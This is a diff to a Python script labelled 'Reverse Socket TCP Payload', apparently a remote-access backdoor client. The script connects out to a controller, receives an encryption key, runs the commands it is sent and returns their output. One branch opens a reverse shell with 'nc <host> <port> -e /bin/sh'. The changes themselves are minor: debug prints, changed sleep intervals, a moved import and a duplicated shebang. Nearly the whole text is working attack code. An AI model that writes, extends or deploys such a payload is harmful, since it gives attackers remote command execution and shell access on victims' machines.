@@ -1,3 +1,12 @@
+#!/usr/bin/env python3
+
+import time
+time.sleep(1)
+HOST = '0.0.0.0'
+PORT = 8090
+TIMEOUT = 5000
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 # Reverse Socket TCP Payload
 # Author: @screamz2k
 import os
@@ -20,12 +29,11 @@ except:
     try:
         for i in imports:
             globals()[i] = importlib.import_module(i)
-        # Manually
-        from cryptography.fernet import Fernet
     except:
         print("Couldnt execute the Stager.")
         print("Please install the required modules manually.")
         exit(1)
+from cryptography.fernet import Fernet
 fernet = ""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -38,14 +46,15 @@ def encrypt(data):
     return fernet.encrypt(data.encode())
 
 
-for i in range(1, TIMEOUT):
+for i in range(0, TIMEOUT):
+    print(i)
     try:
         #cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((HOST, PORT))
     except socket.error as e:
         print("Trying to connect")
-        time.sleep(1)
+        time.sleep(2)
         continue
     print("Connected to Server")
     key = s.recv(1024)
@@ -62,6 +71,10 @@ for i in range(1, TIMEOUT):
         data = data.split(":")
         option = data[0]
         args = data[1:]
+        try:
+            print(option)
+        except:
+            pass
         option = option.lower()
         if option == "cmd":
             s.send(encrypt(sp.getoutput(args)))
@@ -119,3 +132,4 @@ for i in range(1, TIMEOUT):
             # open a shell
             sp.Popen(["nc", args[0], args[1], "-e /bin/sh"])
             s.send(encrypt("Shell Opened"))
+
